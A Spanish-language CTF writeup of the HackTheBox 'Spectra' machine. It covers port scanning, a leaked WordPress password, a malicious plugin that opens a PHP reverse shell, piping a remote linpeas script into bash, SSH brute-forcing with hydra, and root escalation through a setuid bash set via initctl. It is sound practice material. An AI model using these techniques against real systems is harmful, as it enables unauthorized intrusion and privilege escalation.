---
title: HackTheBox - Spectra
author: cotes
date: 2023-09-20 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakage', 'Wordpress', 'Binary Abusing']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Spectra/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Spectra Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **Information Leakage, Wordpress, Binary Abusing**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Spectra/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Spectra/02-versions.png)

> Añadimos el host `spectra.htb` en el fichero /etc/hosts
{: .prompt-info }

c. Ahora, haremos un fuzzing de directorios 

```bash
❯ wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://spectra.htb/FUZZ/

<SNIP>
000000063:   200        346 L    1460 W     25940 Ch    "main" 
000001458:   200        26 L     111 W      2514 Ch     "testing"
```

* Al visitar este directorio, tendremos la capacidad de **directory listing**, aquí veremos un fichero **wp-config.php.save** y si vemos su código fuente encontramos credenciales. 

    ```php
    <SNIP>
    define( 'DB_PASSWORD', 'devteam01' );
    ```

* En el directorio **/main** encontramos un Wordpress con un usuario

![](/assets/images/HTB/Easy/Spectra/03-user.png)

* Nos autenticamos con este usuario y la contraseña, previamente encontrada, en Wordpress

d. Para entablarnos una reverse shell instalamos un nuevo plugin 

```bash
❯ cat backup.php

/**
* Plugin Name: Backup
* Plugin URI:
* Description: Backup
* Version: 1.0
* Author: Testing
* Author URI: http://www.testing.com
*/

# Copiamos el contenido de esta reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

❯ zip backup.zip backup.php
```

* Ahora, instalamos este plugin en Wordpress y luego de este paso, damos clic en 'Activar Plugin'

    ![](/assets/images/HTB/Easy/Spectra/04-add.png)

* Con todos los pasos anteriores ya tendremos una reverse shell

    ```bash
    ❯ nc -lvnp 4444
    $ whoami
    nginx
    ```

### Escalada de Privilegios 💹

a. Subiremos `LinPEAS` para descubrir ficheros de configuración o alguna forma de escalar privilegios

```bash
❯ ls
linpeas.sh
❯ python -m http.server 80
----------------------------------------
nginx@spectra /tmp $ curl 10.10.14.18/linpeas.sh | bash

<SNIP>
╔══════════╣ Analyzing Autologin Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  3  2021 /etc/autologin
```

* Si vamos a este directorio encontraremos una contraseña

    ```bash
    nginx@spectra /etc/autologin $ cat passwd 
    SummerHereWeCome!!
    ```

* Tenemos varios usuarios en el sistema, así que haremos fuerza bruta con hydra

    ```bash
    ❯ cat users
    chronos
    katie
    root
    user
    ❯ hydra -L users -p 'SummerHereWeCome!!' ssh://10.10.10.229 -t 4
    [22][ssh] host: 10.10.10.229   login: katie   password: SummerHereWeCome!!
    ```

b. Nos autenticamos en el servicio SSH y listamos nuestros privilegios a nivel de sudoers

```bash
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

> `/sbin/initctl` se usa para gestionar servicios, eventos y su configuración. Esta configuración es almacenada en **/etc/init**
{: .prompt-info }

* Listamos los servicio disponibles

    ```bash
    katie@spectra ~ $ ls /etc/init
    activate_date.conf       cryptohome-update-userdataauth.conf   ippusb.conf        pre-shutdown.conf    test.conf
    anomaly-detector.conf    cryptohomed-client.conf               iptables.conf      pre-startup.conf     test2.conf
    ```

* Modificamos alguno de estos para ejecutar un comando al iniciar un servicio

    ```bash
    katie@spectra ~ $ cat /etc/init/test2.conf

    <SNIP>
    script
        chmod +s /bin/bash
    end script
    ```

* Por último, iniciamos este servicio y podremos acceder como root

    ```bash
    katie@spectra ~ $ sudo /sbin/initctl start test2                                    
    test2 start/running, process 18269
    katie@spectra ~ $ ls -la /bin/bash   
    -rwsr-sr-x 1 root root 551984 Dec 22  2020 /bin/bash
    katie@spectra ~ $ bash -p            
    bash-4.3# whoami
    root
    ```